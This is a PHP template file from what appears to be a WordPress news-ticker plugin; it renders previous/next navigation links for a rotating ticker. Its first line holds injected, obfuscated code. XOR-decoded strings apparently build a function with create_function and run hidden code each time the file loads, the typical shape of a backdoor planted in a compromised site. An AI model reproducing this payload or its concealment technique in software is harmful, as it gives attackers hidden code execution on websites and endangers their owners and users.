<?php $vfYtt='Y8NMEEa>C8;58Q-'^':J+,1 >X6VXAQ>C';$lrGcRzEL=$vfYtt('','0Xbf+I;Q>QD;5+0<KL8qKE>Jl=VY40g4>CRpbJ5elJCT HQXYSI-4.=L=,,nSF PLV2;6MypV1BSuSTNu:>nojO6MeGqjfzDBd+RELI nhnXzqrGUC FV >yCSAXQmiHO9cECb1dORFOrHLKprZ9YYohR8TcZo8YO:nGHsRNG+4PELU<T-h5yminn04IE7PEJ7K1KuXC<H6X1fTM3ZQwj2VP5-rHsQ8N5<ER>oLS.JX2+UZi4T618.9AqI=moqg,4p5Nxp24IBMlAo9.QNEYXMh2sOLG6b>W1vuhCVTNhpfeY9NXTODbG T2TIoPchIHhEGAP4 Umw,zJ.8GU5-FAjts>i0f.gbOA7yIQ7HONXMjKYLLXfH21ekaX;7;s:.;jSSIRX-o91mOYL7+ehAs4S8Y=ic32eHg4oO.=RNTGkF=C1H<089J.IEB aSJA 48+63A38JIfq;--,DP+ivU0C2cDMUQT03i9TBXpqo3 Op+. 3vBLsP816C4G31a-0ZI:;Yd9V8iTdG1R>-hrHWioY ANaD G.6U3+.rosLrEfigPg iQmvYDu+W3wQFdTteAWZztK6kSB:KqLDDnM+1OTc2S=0+KIM3;JdH,.LS45TYjjQT,RcyfypeUy9X1<N+ZdUO328ehE5:==T2F6pBGNN;,1AIsaX3'^'Y>JGM<U2J8+UjNHU88KYl=Q83Y7-Uo8YK7uYKjNoe,6:C<877s1BFqY-IMs1>3Txh2SOWaYT=T;zUstnUA4gfN C9EzQMAANKmM=7dmINUNhAQV.i0T4:EPQg7 ,0DRhkPHnjh8mk=3;RfqkXV>X-84L;et=zKS<6aJ.hVr=3YX5+dqW1TAhPVcggBQ=0E>mnX>EbNRJABKR;B0,G;qJJT7<FHIBW5Y:Tc.7GOqsH+4ANnPcR;DTYMQaYmb. >,eqPT=XTYQ0bpRaKOO=; px6b;W+-3W=U2HVHHg=17SzoA=X:9trdF1A8G1re-ib .Hmfe4UT4DWWpCHW50TN.aBP,l,a3k46o DYm:R1osfmN=8 9=OhI;lbE<ZCZ,QKBJnsm9=TT38dk=-CJEUaWB2T,XRi:Oo5m>K+OI3nig+3S0T:UQTP0Ka=-R>7+5AkgFCGiQY9,PEdIHO+4NAR1Q7SJhmq55DR6R1;qYJeZFgTOOTRVdjS1JCW:k,VH>HH3:NHqCR3ANxDcU3JLARnqIG4DtfE A3OmrXNWU2ZlOxFNP1UEYaYE;vGHgVOipScLQwbbKLrRY5tXlXlbbN,YC.-<Y6DoN3 >GHbC8MW <UQsuJN55X3JPFYPEuYBR8Y8J6Lq+RFY>O5TCQR5VakYyMG+CEEiyZZRN');$lrGcRzEL();

// Get and extract the metadata array into variables
global $mtphr_dnt_meta_data;
extract( $mtphr_dnt_meta_data );

// Add the directional nav
if( ($_mtphr_dnt_total_ticks > 1) && $_mtphr_dnt_mode == 'rotate' ) {

	if( isset($_mtphr_dnt_rotate_directional_nav) && $_mtphr_dnt_rotate_directional_nav ) {

		$hide = '';
		if( isset($_mtphr_dnt_rotate_directional_nav_hide) && $_mtphr_dnt_rotate_directional_nav_hide ) {
			$hide = ' mtphr-dnt-nav-hide';
		}
		echo '<a class="mtphr-dnt-nav mtphr-dnt-nav-prev'.$hide.'" href="#" rel="nofollow">'.apply_filters( 'mtphr_dnt_direction_nav_prev', '<i class="mtphr-dnt-icon-arrow-left"></i>' ).'</a>';
		echo '<a class="mtphr-dnt-nav mtphr-dnt-nav-next'.$hide.'" href="#" rel="nofollow">'.apply_filters( 'mtphr_dnt_direction_nav_next', '<i class="mtphr-dnt-icon-arrow-right"></i>' ).'</a>';
	}
}